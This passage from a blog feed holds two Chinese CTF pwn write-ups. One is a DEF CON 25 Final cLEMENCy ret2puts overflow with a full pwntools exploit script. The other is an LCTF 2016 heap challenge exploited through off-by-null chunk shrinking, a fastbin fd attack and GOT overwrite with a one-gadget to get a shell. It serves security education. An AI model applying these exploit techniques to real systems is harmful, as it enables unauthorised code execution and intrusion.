<p>提到<code>cLEMENCy</code>就不得不提到刚过去的<code>Defcon 25 Final</code>。与去年的CGC不同，<code>Defcon Final</code>今年的规则是，主办方与比赛前一天24小时放出自定义架构，以及相应的<code>emulator</code>，留给参赛者24小时的准备时间。这样一来，所有的参赛队都站在了同一起跑线上，需要从0准备所有的工具。</p>
<h2 id="0x01-简介：9bit的奇怪架构"><a href="#0x01-简介：9bit的奇怪架构" class="headerlink" title="0x01 简介：9bit的奇怪架构"></a>0x01 简介：9bit的奇怪架构</h2><p><code>cLEMENCy（the LEgitbs Middle ENdian Computer architecture）</code>由LBS的lighting等大佬们设计。<code>cLEMENCy</code>的指令手册中给出了架构的所有细节。简单的总结如下：</p>
<ol>
<li><p>每字节由9bit组成；使用混合序存储，Register XXYYZZ → Memory YYXXZZ，Register XXYY → Memory YYXX</p>
<blockquote>
<p>“Each byte is 9 bits of data, bit 0 is the left most significant bit. Middle-Endian data stores bits 9 to 17, followed by bits 0 to 8, then bits 18 to 27 in memory when handling three bytes. Two bytes of data will have bits 9-17 then bits 0 to 8 written to memory.”</p>
</blockquote>
</li>
<li><p>内存布局：如下图所示。漏洞利用的目标即把Flag页面开始的一段内存，即flag打印出来。所以说只需要任意地址读就可以了。</p>
<p> <img src="https://ws3.sinaimg.cn/large/006tNc79gy1fija68reuoj310y0hkn1b.jpg" alt=""></p>
</li>
<li><p>指令集：cLEMENCy是RISC，不过最长54bit，指令集和arm有点类似；</p>
</li>
<li><p>寄存器：共31个寄存器，<code>R0</code>一般用于<code>param 1</code>和<code>ret value</code>，<code>ST</code>表示栈，<code>RA</code>表示返回地址。</p>
</li>
<li><p>栈调用：栈有两个增长方向；对栈的操作往往通过<code>STT(Store Tri)</code>指令实现。<code>STTm</code>指令有三种，其中0，1，2分别表示内容存入memory之后<code>rB</code>操作数是增加还是减少，从而表示栈的增长方向。</p>
</li>
</ol>
<p>除此之外，比赛中使用的bianry使用了<code>neatlibc</code>，但为了方便模拟器对io和内存管理进行了一些修改。</p>
<h2 id="0x02-漏洞利用：Ret2Put"><a href="#0x02-漏洞利用：Ret2Put" class="headerlink" title="0x02 漏洞利用：Ret2Put"></a>0x02 漏洞利用：Ret2Put</h2><p>既然是2个小时的CTF，大佬们出题肯定是放足了水233。用IDA大概分析一下，可以发现这是一个简单的伪<code>&quot;Base64&quot;</code>。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijbgetydzj312w0ocdoa.jpg" alt=""></p>
<blockquote>
<p>这里用的是<code>Tea Deliverers</code>在比赛时使用的<code>IDA Processor</code>（膜LYM和Explorer和GYC等大佬）。PPP在赛后也放出了他们比赛时使用的<a href="https://github.com/pwning/defcon25-public" target="_blank" rel="external">Utils</a>。</p>
</blockquote>
<p>其中主要的函数<code>read_string</code>:输入一个9bit表示的字符串（交互也全部都是基于9bit），之后会以三字节为单位，转成以三字节为单位的值。如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AAA\n&apos; -&gt; 0010101</div></pre></td></tr></table></figure></p>
<p>在调用这个函数时，传入的len过长，于是可以溢出上一个函数的返回地址，因此我们可以直接<code>Ret2put</code>，即修改返回地址和参数为<code>Put</code>函数和<code>flag page</code>的地址，即可打印出flag。</p>
<p>观察main_func返回处，<code>LDT R28-RA, [R28 + 0]</code>将R28, ST, RA三个寄存器赋值，是可控的，而puts的参数R0也通过<code>ad. R0, R28, R27</code>控制。</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fijbr5ncb1j30kx0euq7p.jpg" alt=""><br>A</p>
<p>于是构造对应值即可。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijc2pzv9uj30iq068gnz.jpg" alt=""></p>
<p>还有一点是，ST要填上一个合法值，否则<code>puts</code>时会<code>crash</code>。但是程序是没有随机化的，所以每次运行都一样。这也导致了比赛时”抄作业(直接重放)”异常方便。</p>
<p>最终代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">p27</span><span class="params">(bit24)</span>:</span></div><div class="line">    r = bin(bit24)[<span class="number">2</span>:].rjust(<span class="number">27</span>, <span class="string">'0'</span>)</div><div class="line">    r = r[<span class="number">9</span>:<span class="number">18</span>] + r[<span class="number">0</span>:<span class="number">9</span>] + r[<span class="number">18</span>:<span class="number">27</span>]</div><div class="line">    <span class="keyword">return</span> r</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sb8tosb9</span><span class="params">(payload)</span>:</span></div><div class="line">    stream = <span class="string">''</span>.join(bin(ord(x))[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> payload)</div><div class="line">    pad = len(stream) % <span class="number">8</span></div><div class="line">    <span class="keyword">if</span> pad != <span class="number">0</span>:</div><div class="line">        length = len(stream) + (<span class="number">8</span> - pad)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        length = len(stream)</div><div class="line">    stream = stream.ljust(length, <span class="string">'0'</span>)</div><div class="line">    payload9 = <span class="string">''</span>.join(</div><div class="line">        chr(int(stream[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(stream), <span class="number">8</span>))</div><div class="line">    <span class="keyword">return</span> payload9</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sb9tosb8</span><span class="params">(payload)</span>:</span></div><div class="line">    stream = <span class="string">''</span>.join(bin(ord(x))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> payload)</div><div class="line">    length = (len(stream) / <span class="number">9</span>) * <span class="number">9</span></div><div class="line">    stream = stream[:length]</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(</div><div class="line">        chr(int(stream[i:i + <span class="number">9</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(stream), <span class="number">9</span>))</div><div class="line"></div><div class="line">alphabet = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    alphabet += (chr(i + ord(<span class="string">'A'</span>)))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    alphabet += (chr(i + ord(<span class="string">'a'</span>)))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    alphabet += (chr(i + ord(<span class="string">'0'</span>)))</div><div class="line">alphabet += <span class="string">'+/'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">conventer</span><span class="params">(bit18)</span>:</span></div><div class="line">    res = <span class="string">''</span></div><div class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[:<span class="number">6</span>],<span class="number">2</span>)]</div><div class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[<span class="number">6</span>:<span class="number">12</span>],<span class="number">2</span>)]</div><div class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[<span class="number">-6</span>:],<span class="number">2</span>)]</div><div class="line">    <span class="keyword">return</span> res</div><div class="line"></div><div class="line"></div><div class="line">p = remote(<span class="string">"54.223.103.62"</span>,<span class="number">10000</span>)</div><div class="line">flag_addr = <span class="number">0x4010000</span> + <span class="number">0x21</span></div><div class="line">pc_addr = <span class="number">0x645F</span></div><div class="line">newpld = <span class="number">11</span> * p27(<span class="number">0x414141</span>) + p27(flag_addr) + p27(<span class="number">0x3fffbc7</span>) + p27(pc_addr)</div><div class="line">payload = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(newpld) / <span class="number">18</span>):</div><div class="line">    payload += conventer(newpld[i*<span class="number">18</span>:(i+<span class="number">1</span>)*<span class="number">18</span>])</div><div class="line">p.send(sb8tosb9(payload + <span class="string">'\n'</span>))</div><div class="line">p.recvn(<span class="number">0x2d</span>)</div><div class="line">data = sb9tosb8(p.recvall(timeout = <span class="number">1</span>))</div><div class="line"><span class="keyword">print</span> data</div></pre></td></tr></table></figure>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fijbzy7fl3j30c7014t91.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅~&lt;/p&gt;
&lt;p&gt;上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的&lt;strong&gt;烧烤 + 德州扑克&lt;/s
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn500：shrink the chunk(LCTF 2016)</title>
    <link href="https://windcarp.github.io/2016/12/27/Test-Blog/"/>
    <id>https://windcarp.github.io/2016/12/27/Test-Blog/</id>
    <published>2016-12-27T07:27:12.000Z</published>
    <updated>2018-03-21T18:38:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>这是一篇测试博客。</p>
</blockquote>
<p>XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊…</p>
<p>那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the trunk，fastbin corruption， magic alloc和onegadget，还是比较复杂的。</p>
<hr>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先，题目的结构大概如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sender</div><div class="line">    recver</div><div class="line">        package package package</div></pre></td></tr></table></figure></p>
<p>一个bss总指针带出来三条线负责管理。<br>首先要有一个sender，然后用sender可以去新建recver，新建完之后，可以新建package挂在sender上面，每个结构都是通过链表来表示，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00000000 package_node    struc ; (sizeof=0x20, mappedto_3)</div><div class="line">00000000 next            dq ?                    ; offset</div><div class="line">00000008 prev            dq ?                    ; offset</div><div class="line">00000010 size            dq ?</div><div class="line">00000018 contant         dq ?</div></pre></td></tr></table></figure></p>
<p>但总结来看，就是提供了一个malloc与free 的接口，malloc的大小小于0x208，然后show是用%s输出。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>输入函数的off-by-null。这个函数第一次看竟然放过去了。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>根据前面分析的条件，利用可以通过shrink the trunk进行。</p>
<p>其中要注意的是大小，原理是通过修改free small trunk的size字段，使再分配时对下一块prev size和prez inuse的修改无效。那如果再对下一块进行释放，仍然会通过prev size prev inuse进行合并操作，从而造成中间再分配的chunk被大块包含在内。</p>
<p>接下来，可以通过fastbin fd attack进行，前提是leak。<br>我们通过修改链表指针达到leak libc的效果。接下来重来一遍，进行fd attack。</p>
<p>这个fd attack要绕过检查，只能使用上一个字是0x0000的0x7fxxxx的地址进行。假设0x7fff地址是addr，则我们需要输入addr-0x3-0x8才能达到使用效果。</p>
<p>那么问题又来了，因为这里题目会在新分配的块写上0x18的东西，相当于后面的0x18之后才能覆盖，寻找malloc_hook, free_hook, got_table均不行。</p>
<p>随便在附近看看，发现其实malloc_hook hijack后面正好有top_chunk的位置，而且好险可以写低5个字节。</p>
<p>进行尝试，发现main_arena前面flags，虽然覆盖了但是影响不大，我们控制top_chunk到got_table的位置，成功分配了gottable上面。然后里面的函数覆盖为onegadget，才最终弹出shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">init()</div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #test for off-by-one shrink the chunk to get overlaped chunk</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x10,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x30 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line"></div><div class="line"></div><div class="line">link_header = 0x6030B8</div><div class="line">show_target = 0x603090 #stdout / stdin to leak libc</div><div class="line"></div><div class="line">payload1 = &apos;g&apos; * 0xf8 + p64(show_target) + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload1) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">data =show_package()</div><div class="line">t = data[data.rfind(&quot;length:&quot;):]</div><div class="line">leak_stdout = int(t[7:t.find(&apos;\tcontent:&apos;)],10)</div><div class="line">leak_libc = leak_stdout - offset__IO_2_1_stdout_</div><div class="line">malloc_hook_libc = leak_libc + offset___malloc_hook</div><div class="line">onegadget_libc = leak_libc + off_onegadget</div><div class="line">target = malloc_hook_libc - 0x3 - 0x8#prev 0x7f and -0x3, chunk ptr -0x8</div><div class="line">print &quot;leak_libc: &quot;,hex(leak_libc)</div><div class="line">print &quot;malloc_hook_libc: &quot;,hex(malloc_hook_libc)</div><div class="line">print &quot;onegadget_libc: &quot;, hex(onegadget_libc)</div><div class="line">print &quot;target: &quot;,hex(target)</div><div class="line"></div><div class="line"></div><div class="line">set_package(0x100,&apos;h&apos;*0x8 + &apos;\n&apos;) #get 0x120 chunk and leave</div><div class="line">back_send_loop()</div><div class="line">back_loop()</div><div class="line">init()</div><div class="line"></div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #then use fastbin fd attack, attention we need 0x70 chunk and overwrite it with onegadget</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x50,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x70 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line">del_package(1) #free 0x70 &apos;f&apos; chunk</div><div class="line">payload2 = &apos;g&apos; * 0xe8 + p64(0x110) + p64(0x70) + p64(target)[:-1] + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload2) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">set_package(0x50,&apos;h&apos; * 0x8 + &apos;\n&apos;) #get 0x70 &apos;f&apos; chunk and turn to &apos;h&apos;</div><div class="line">attach()</div><div class="line">back_send_loop()</div><div class="line">to_recv_loop()</div><div class="line">set_recver()</div><div class="line"></div><div class="line">payload3 = &apos;\x00&apos;*0x4b + &quot;\xf8\x2f\x60&quot; + &apos;\n&apos;</div><div class="line">set_package(0x50,payload3)#get malloc_hook_chunk and set top_chunk to 0x602ff8</div><div class="line">payload4 = p64(onegadget_libc) + p64(onegadget_libc) + &apos;\n&apos;</div><div class="line">set_package(0x1f0,payload4)</div><div class="line">cv(&quot;your choice : &quot;)</div><div class="line">sd(&quot;y&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这是一篇测试博客。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊…&lt;/p&gt;
&lt;p&gt;那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the t
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
